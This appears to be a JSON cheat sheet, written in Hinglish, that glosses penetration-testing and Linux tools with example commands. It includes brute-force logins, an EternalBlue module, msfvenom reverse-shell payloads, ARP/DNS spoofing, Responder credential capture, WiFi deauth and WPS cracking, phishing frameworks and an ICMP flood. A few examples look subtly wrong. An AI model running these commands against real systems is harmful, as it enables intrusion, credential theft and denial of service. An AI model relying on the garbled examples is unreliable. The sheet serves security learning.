@@ -1,0 +1,647 @@
+{
+    "nmap": {
+        "meaning": "Network scanner - target ke open ports aur services pata karne ke liye",
+        "examples": [
+            "nmap -sV 192.168.1.1 - version detection",
+            "nmap -sn 192.168.1.0/24 - ping sweep",
+            "nmap -p- 192.168.1.1 - all ports scan"
+        ],
+        "options": {
+            "-sV": "Version detection on",
+            "-sn": "Ping scan only",
+            "-p-": "All 65535 ports",
+            "-sS": "Stealth SYN scan",
+            "-A": "Aggressive scan (OS + version + scripts)"
+        }
+    },
+    "hydra": {
+        "meaning": "Password brute-force tool - login credentials crack karne ke liye",
+        "examples": [
+            "hydra -l admin -P wordlist.txt ssh://192.168.1.1",
+            "hydra -L users.txt -P pass.txt ftp://192.168.1.1"
+        ]
+    },
+    "metasploit": {
+        "meaning": "Exploitation framework - vulnerabilities ko exploit karne ke liye",
+        "examples": [
+            "msfconsole - start metasploit",
+            "use exploit/windows/smb/ms17_010_eternalblue"
+        ]
+    },
+    "aircrack-ng": {
+        "meaning": "WiFi security testing - WEP/WPA passwords crack karne ke liye",
+        "examples": [
+            "airodump-ng wlan0mon - capture packets",
+            "aircrack-ng -w wordlist.cap - capture file"
+        ]
+    },
+    "sqlmap": {
+        "meaning": "SQL injection automation tool - websites mein SQLi test karne ke liye",
+        "examples": [
+            "sqlmap -u http://target.com/page?id=1 --dbs",
+            "sqlmap -u http://target.com/page?id=1 --tables -D database_name"
+        ]
+    },
+    "nikto": {
+        "meaning": "Web server scanner - misconfigurations aur vulnerabilities scan karne ke liye",
+        "examples": [
+            "nikto -h http://target.com",
+            "nikto -h https://target.com -ssl"
+        ]
+    },
+    "john": {
+        "meaning": "John the Ripper - password hash crack karne ke liye",
+        "examples": [
+            "john --wordlist=rockyou.txt hash.txt",
+            "john --format=md5 hash.txt"
+        ]
+    },
+    "dirb": {
+        "meaning": "Directory brute-force - hidden directories aur files find karne ke liye",
+        "examples": [
+            "dirb http://target.com",
+            "dirb http://target.com /usr/share/wordlists/dirb/common.txt"
+        ]
+    },
+    "gobuster": {
+        "meaning": "Directory/file brute-force - fast scanner",
+        "examples": [
+            "gobuster dir -u http://target.com -w wordlist.txt",
+            "gobuster dns -d target.com -w subdomains.txt"
+        ]
+    },
+    "wpscan": {
+        "meaning": "WordPress security scanner - WordPress vulnerabilities detect karne ke liye",
+        "examples": [
+            "wpscan --url http://target.com --enumerate p",
+            "wpscan --url http://target.com --api-token TOKEN"
+        ]
+    },
+    "netcat": {
+        "meaning": "Networking swiss army knife - port scanning, file transfer, reverse shells",
+        "examples": [
+            "nc -lvnp 4444 - listen on port 4444",
+            "nc 192.168.1.1 80 - connect to port 80"
+        ]
+    },
+    "tcpdump": {
+        "meaning": "Packet sniffer - network traffic capture karne ke liye",
+        "examples": [
+            "tcpdump -i eth0 - packet capture on eth0",
+            "tcpdump -i eth0 port 80 - capture HTTP traffic"
+        ]
+    },
+    "wireshark": {
+        "meaning": "Network packet analyzer - GUI tool for detailed packet analysis",
+        "examples": [
+            "wireshark - start GUI",
+            "tshark -r capture.pcap - read pcap file"
+        ]
+    },
+    "burpsuite": {
+        "meaning": "Web application testing proxy - HTTP requests intercept/modify karne ke liye",
+        "examples": [
+            "burpsuite - start GUI",
+            "Use as proxy for browser traffic"
+        ]
+    },
+    "enum4linux": {
+        "meaning": "Windows/Linux enumeration tool - SMB shares, users, groups find karne ke liye",
+        "examples": [
+            "enum4linux -a 192.168.1.1 - all enumeration",
+            "enum4linux -U 192.168.1.1 - list users"
+        ]
+    },
+    "smbclient": {
+        "meaning": "SMB client - Windows file shares access karne ke liye",
+        "examples": [
+            "smbclient -L //192.168.1.1 - list shares",
+            "smbclient //192.168.1.1/share -U username"
+        ]
+    },
+    "ssh": {
+        "meaning": "Secure Shell - remote system access karne ke liye",
+        "examples": [
+            "ssh user@192.168.1.1 - connect to remote",
+            "ssh -p 2222 user@192.168.1.1 - custom port"
+        ]
+    },
+    "scp": {
+        "meaning": "Secure copy - files transfer karne ke liye SSH ke through",
+        "examples": [
+            "scp file.txt user@192.168.1.1:/home/user/",
+            "scp user@192.168.1.1:/home/user/file.txt ./"
+        ]
+    },
+    "wget": {
+        "meaning": "Download tool - internet se files download karne ke liye",
+        "examples": [
+            "wget http://example.com/file.zip",
+            "wget -r http://example.com - recursive download"
+        ]
+    },
+    "curl": {
+        "meaning": "HTTP client - web requests send karne ke liye",
+        "examples": [
+            "curl http://target.com",
+            "curl -X POST -d 'data' http://target.com"
+        ]
+    },
+    "ping": {
+        "meaning": "Network connectivity test - host alive hai ya nahi check karne ke liye",
+        "examples": [
+            "ping 192.168.1.1",
+            "ping -c 4 google.com - send 4 packets"
+        ]
+    },
+    "traceroute": {
+        "meaning": "Network path tracer - packets ka route dikhane ke liye",
+        "examples": [
+            "traceroute google.com",
+            "traceroute -n 192.168.1.1 - no DNS lookup"
+        ]
+    },
+    "whois": {
+        "meaning": "Domain info - domain ke baare mein ownership details",
+        "examples": [
+            "whois google.com",
+            "whois 192.168.1.1 - IP info"
+        ]
+    },
+    "dig": {
+        "meaning": "DNS lookup - domain ke DNS records nikalne ke liye",
+        "examples": [
+            "dig google.com",
+            "dig -x 8.8.8.8 - reverse DNS lookup"
+        ]
+    },
+    "nslookup": {
+        "meaning": "DNS query - domain se IP ya IP se domain nikalne ke liye",
+        "examples": [
+            "nslookup google.com",
+            "nslookup 8.8.8.8"
+        ]
+    },
+    "host": {
+        "meaning": "DNS lookup utility - simple domain to IP conversion",
+        "examples": [
+            "host google.com",
+            "host -t MX google.com - mail records"
+        ]
+    },
+    "netstat": {
+        "meaning": "Network statistics - open ports, connections dikhane ke liye",
+        "examples": [
+            "netstat -tulpn - listening ports",
+            "netstat -an - all connections"
+        ]
+    },
+    "ss": {
+        "meaning": "Socket statistics - modern netstat replacement",
+        "examples": [
+            "ss -tulpn",
+            "ss -an"
+        ]
+    },
+    "iptables": {
+        "meaning": "Firewall - network traffic filter karne ke liye",
+        "examples": [
+            "iptables -L - list rules",
+            "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"
+        ]
+    },
+    "ufw": {
+        "meaning": "Uncomplicated Firewall - easy firewall management",
+        "examples": [
+            "ufw enable - enable firewall",
+            "ufw allow 22/tcp - allow SSH"
+        ]
+    },
+    "arpspoof": {
+        "meaning": "ARP poisoning - MITM attacks ke liye network traffic redirect",
+        "examples": [
+            "arpspoof -i eth0 -t 192.168.1.1 192.168.1.2",
+            "arpspoof -i eth0 -t 192.168.1.2 192.168.1.1"
+        ]
+    },
+    "ettercap": {
+        "meaning": "Network sniffing - MITM attacks, packet sniffing",
+        "examples": [
+            "ettercap -G - GUI mode",
+            "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.2//"
+        ]
+    },
+    "bettercap": {
+        "meaning": "Modern network attack tool - WiFi, ARP, DNS spoofing",
+        "examples": [
+            "bettercap -iface eth0",
+            "bettercap -eval 'set arp.spoof.targets 192.168.1.1; arp.spoof on'"
+        ]
+    },
+    "dnschef": {
+        "meaning": "DNS spoofing tool - fake DNS responses",
+        "examples": [
+            "dnschef --fakedomains google.com --fakeip 192.168.1.100",
+            "dnschef --interface 0.0.0.0"
+        ]
+    },
+    "responder": {
+        "meaning": "LLMNR/NBT-NS poisoning - credentials capture karne ke liye",
+        "examples": [
+            "responder -I eth0 -A - analyze mode",
+            "responder -I eth0 -wF - full attack"
+        ]
+    },
+    "hashcat": {
+        "meaning": "Password cracker - GPU acceleration ke saath fastest hash cracking",
+        "examples": [
+            "hashcat -m 0 -a 0 hash.txt rockyou.txt - MD5 crack",
+            "hashcat -m 1000 -a 3 hash.txt ?d?d?d?d?d?d?d?d - NTLM brute"
+        ]
+    },
+    "cewl": {
+        "meaning": "Wordlist generator - website se words extract karke custom wordlist",
+        "examples": [
+            "cewl http://target.com -w wordlist.txt",
+            "cewl -d 3 -m 5 http://target.com - depth 3, min 5 characters"
+        ]
+    },
+    "crunch": {
+        "meaning": "Wordlist generator - custom patterns ke hisaab se wordlist",
+        "examples": [
+            "crunch 8 8 abc123 -o wordlist.txt",
+            "crunch 8 10 -t pass@@@@ - pattern based"
+        ]
+    },
+    "patator": {
+        "meaning": "Multi-purpose brute-forcer - HTTP, FTP, SSH, etc",
+        "examples": [
+            "patator http_fuzz url=http://target.com/file.php?file=FILE0 0=/usr/share/wordlists/dirb/common.txt",
+            "patator ssh_login host=192.168.1.1 user=root password=FILE0 0=passwords.txt"
+        ]
+    },
+    "medusa": {
+        "meaning": "Parallel brute-force tool - multiple services ke liye",
+        "examples": [
+            "medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ssh",
+            "medusa -H hosts.txt -U users.txt -P pass.txt -M ftp"
+        ]
+    },
+    "ncrack": {
+        "meaning": "High-speed network authentication cracking",
+        "examples": [
+            "ncrack -p ssh://192.168.1.1:22 -U users.txt -P pass.txt",
+            "ncrack -p rdp://192.168.1.1:3389 -U admin -P wordlist.txt"
+        ]
+    },
+    "exploitdb": {
+        "meaning": "Searchsploit - known exploits find karne ke liye",
+        "examples": [
+            "searchsploit apache - search apache exploits",
+            "searchsploit -x 12345 - view exploit code"
+        ]
+    },
+    "msfvenom": {
+        "meaning": "Payload generator - reverse shells, meterpreter payloads",
+        "examples": [
+            "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell",
+            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe"
+        ]
+    },
+    "beef": {
+        "meaning": "Browser Exploitation Framework - browser-based attacks",
+        "examples": [
+            "beef-xss - start BEEF",
+            "hook.js - inject into web pages"
+        ]
+    },
+    "socialfish": {
+        "meaning": "Phishing framework - fake login pages banane ke liye",
+        "examples": [
+            "socialfish - create phishing pages",
+            "Use with ngrok for public access"
+        ]
+    },
+    "airmon-ng": {
+        "meaning": "WiFi interface management - monitor mode enable/disable",
+        "examples": [
+            "airmon-ng start wlan0 - enable monitor mode",
+            "airmon-ng stop wlan0mon - disable monitor mode"
+        ]
+    },
+    "airodump-ng": {
+        "meaning": "WiFi sniffing - APs aur connected clients dekho",
+        "examples": [
+            "airodump-ng wlan0mon",
+            "airodump-ng wlan0mon -c 6 -w capture - channel 6"
+        ]
+    },
+    "aireplay-ng": {
+        "meaning": "WiFi packet injection - deauth, fake auth attacks",
+        "examples": [
+            "aireplay-ng -0 0 -a MAC_AP wlan0mon - deauth attack",
+            "aireplay-ng -3 -b MAC_AP -h MAC_CLIENT wlan0mon - ARP replay"
+        ]
+    },
+    "wash": {
+        "meaning": "WPS scanner - WPS-enabled APs search karne ke liye",
+        "examples": [
+            "wash -i wlan0mon",
+            "wash -i wlan0mon -c 1"
+        ]
+    },
+    "reaver": {
+        "meaning": "WPS PIN brute-force - WPS PIN crack karne ke liye",
+        "examples": [
+            "reaver -i wlan0mon -b MAC_AP -vv",
+            "reaver -i wlan0mon -b MAC_AP -p 12345670 - specific PIN"
+        ]
+    },
+    "bully": {
+        "meaning": "WPS PIN cracker - reaver ka alternative",
+        "examples": [
+            "bully wlan0mon -b MAC_AP",
+            "bully wlan0mon -b MAC_AP -E - 50% faster"
+        ]
+    },
+    "mdk4": {
+        "meaning": "WiFi attack framework - beacon flooding, deauth, DoS",
+        "examples": [
+            "mdk4 wlan0mon b - many beacons",
+            "mdk4 wlan0mon d - deauth attack"
+        ]
+    },
+    "fluxion": {
+        "meaning": "WiFi phishing tool - Evil Twin attack",
+        "examples": [
+            "fluxion - start GUI",
+            "Fake AP banake credentials churana"
+        ]
+    },
+    "wifite": {
+        "meaning": "Automated WiFi auditing tool - WPA/WPS automatic crack",
+        "examples": [
+            "wifite - all in one",
+            "wifite -p 12345678 - specific PIN"
+        ]
+    },
+    "kismet": {
+        "meaning": "WiFi sniffer/analyzer - network mapping aur tracking",
+        "examples": [
+            "kismet - start server",
+            "kismet -c wlan0mon - capture"
+        ]
+    },
+    "tcpflow": {
+        "meaning": "TCP stream capture - packets ko streams mein convert",
+        "examples": [
+            "tcpflow -i eth0",
+            "tcpflow -r capture.pcap - read pcap"
+        ]
+    },
+    "ngrep": {
+        "meaning": "Network grep - packets mein specific patterns search",
+        "examples": [
+            "ngrep -i 'password' - packages search",
+            "ngrep -q -d eth0 - port 80"
+        ]
+    },
+    "tcpreplay": {
+        "meaning": "Packet replay tool - captured packets ko replay karo",
+        "examples": [
+            "tcpreplay -i eth0 capture.pcap",
+            "tcpreplay -i eth0 --loop 10 capture.pcap"
+        ]
+    },
+    "hping3": {
+        "meaning": "Advanced ping - custom packets bhejo, DoS testing",
+        "examples": [
+            "hping3 -S -p 80 192.168.1.1 - SYN scan",
+            "hping3 -1 --flood 192.168.1.1 - ICMP flood"
+        ]
+    },
+    "nping": {
+        "meaning": "Nmap's ping tool - packet generation aur analysis",
+        "examples": [
+            "nping -p 80 192.168.1.1",
+            "nping --tcp -p 80 --flags syn 192.168.1.1"
+        ]
+    },
+    "masscan": {
+        "meaning": "Fast port scanner - millions of IPs per second",
+        "examples": [
+            "masscan -p80,443 192.168.1.0/24",
+            "masscan -p1-65535 192.168.1.1 --rate=1000"
+        ]
+    },
+    "unicornscan": {
+        "meaning": "Port scanner - asynchronous scanning",
+        "examples": [
+            "unicornscan -mT 192.168.1.1 - TCP scan",
+            "unicornscan -mU 192.168.1.1 - UDP scan"
+        ]
+    },
+    "dnsrecon": {
+        "meaning": "DNS enumeration - subdomains, MX records, etc",
+        "examples": [
+            "dnsrecon -d target.com",
+            "dnsrecon -d target.com -t axfr - zone transfer"
+        ]
+    },
+    "dnsenum": {
+        "meaning": "DNS enumeration - advanced DNS recon",
+        "examples": [
+            "dnsenum target.com",
+            "dnsenum --noreverse target.com - no reverse lookup"
+        ]
+    },
+    "fierce": {
+        "meaning": "DNS reconnaissance - subdomain brute-force",
+        "examples": [
+            "fierce -dns target.com",
+            "fierce -dns target.com --wordlist wordlist.txt"
+        ]
+    },
+    "theharvester": {
+        "meaning": "OSINT tool - emails, domains, IPs collect",
+        "examples": [
+            "theharvester -d target.com -b google",
+            "theharvester -d target.com -b linkedin -l 500"
+        ]
+    },
+    "recon-ng": {
+        "meaning": "OSINT framework - modules ke saath reconnaissance",
+        "examples": [
+            "recon-ng - enter framework",
+            "marketplace install - install modules"
+        ]
+    },
+    "sherlock": {
+        "meaning": "Username search - social media par username search",
+        "examples": [
+            "sherlock username",
+            "sherlock username1 username2 - multiple"
+        ]
+    },
+    "holehe": {
+        "meaning": "Email OSINT - email registered hai ya nahi check",
+        "examples": [
+            "holehe email@example.com",
+            "holehe --only-used email@example.com"
+        ]
+    },
+    "whatweb": {
+        "meaning": "Web technology fingerprint - CMS, frameworks detect",
+        "examples": [
+            "whatweb http://target.com",
+            "whatweb -a 3 http://target.com - aggressive scan"
+        ]
+    },
+    "wappalyzer": {
+        "meaning": "Web technologies detector - browser extension + CLI",
+        "examples": [
+            "wappalyzer-cli http://target.com",
+            "wappalyzer-cli --user-agent 'custom' http://target.com"
+        ]
+    },
+    "httrack": {
+        "meaning": "Website copier - entire website download karne ke liye",
+        "examples": [
+            "httrack http://target.com -O ./site",
+            "httrack http://target.com --mirror"
+        ]
+    },
+    "gospider": {
+        "meaning": "Spider/crawler - URLs find karne ke liye",
+        "examples": [
+            "gospider -s http://target.com",
+            "gospider -s http://target.com -o output.txt"
+        ]
+    },
+    "ffuf": {
+        "meaning": "Fast fuzzing tool - directory, parameter fuzzing",
+        "examples": [
+            "ffuf -w wordlist.txt -u http://target.com/FUZZ",
+            "ffuf -w params.txt -u http://target.com?FUZZ=test"
+        ]
+    },
+    "dirsearch": {
+        "meaning": "Directory scanner - hidden directories find",
+        "examples": [
+            "dirsearch -u http://target.com",
+            "dirsearch -u http://target.com -e php,txt"
+        ]
+    },
+    "wfuzz": {
+        "meaning": "Web fuzzer - parameter fuzzing, brute-force",
+        "examples": [
+            "wfuzz -c -w wordlist.txt http://target.com?id=FUZZ",
+            "wfuzz -c -w users.txt -w pass.txt http://target.com/login.php?user=FUZZ&pass=FUZ2Z"
+        ]
+    },
+    "xtream": {
+        "meaning": "XSS/DDoS tool - HTTP attack testing",
+        "examples": [
+            "xtream -s http://target.com - XSS scan",
+            "xtream -s http://target.com -p 80 - port"
+        ]
+    },
+    "xsser": {
+        "meaning": "XSS scanner - cross-site scripting find karo",
+        "examples": [
+            "xsser -u http://target.com",
+            "xsser -u http://target.com --auto"
+        ]
+    },
+    "dvwa": {
+        "meaning": "Damn Vulnerable Web App - practice ke liye vulnerable website",
+        "examples": [
+            "dvwa - start local server",
+            "http://localhost/dvwa - access"
+        ]
+    },
+    "join": {
+        "meaning": "File merger - multiple files ko merge karo",
+        "examples": [
+            "join file1.txt file2.txt",
+            "join -t, file1.csv file2.csv - CSV merge"
+        ]
+    },
+    "awk": {
+        "meaning": "Text processing - pattern matching, column extraction",
+        "examples": [
+            "awk '{print $1}' file.txt - first column",
+            "awk '/pattern/ {print}' file.txt - pattern search"
+        ]
+    },
+    "sed": {
+        "meaning": "Stream editor - text replace, delete, modify",
+        "examples": [
+            "sed 's/old/new/g' file.txt - replace",
+            "sed -i 's/foo/bar/g' file.txt - in-place replace"
+        ]
+    },
+    "grep": {
+        "meaning": "Text search - files mein pattern search karo",
+        "examples": [
+            "grep 'pattern' file.txt",
+            "grep -r 'pattern' ./ - recursive search"
+        ]
+    },
+    "find": {
+        "meaning": "File finder - files aur directories search karo",
+        "examples": [
+            "find / -name 'file.txt'",
+            "find / -type f -size +100M - large files"
+        ]
+    },
+    "locate": {
+        "meaning": "Fast file search - database se quick search",
+        "examples": [
+            "locate file.txt",
+            "updatedb - update database"
+        ]
+    },
+    "chmod": {
+        "meaning": "Permissions change - file permissions modify karo",
+        "examples": [
+            "chmod 755 script.sh",
+            "chmod +x script.sh - make executable"
+        ]
+    },
+    "chown": {
+        "meaning": "Ownership change - file owner aur group change",
+        "examples": [
+            "chown user:group file.txt",
+            "chown -R user:group /folder/"
+        ]
+    },
+    "kill": {
+        "meaning": "Process killer - running processes stop karo",
+        "examples": [
+            "kill PID - process ID se",
+            "kill -9 PID - force kill"
+        ]
+    },
+    "pkill": {
+        "meaning": "Pattern-based process kill - name se process kill",
+        "examples": [
+            "pkill firefox",
+            "pkill -u username - user ke processes"
+        ]
+    },
+    "systemctl": {
+        "meaning": "Service management - systemd services manage",
+        "examples": [
+            "systemctl start service",
+            "systemctl enable service - auto-start"
+        ]
+    },
+    "service": {
+        "meaning": "Service management - old init.d services",
+        "examples": [
+            "service apache2 start",
+            "service apache2 status"
+        ]
+    }
+}
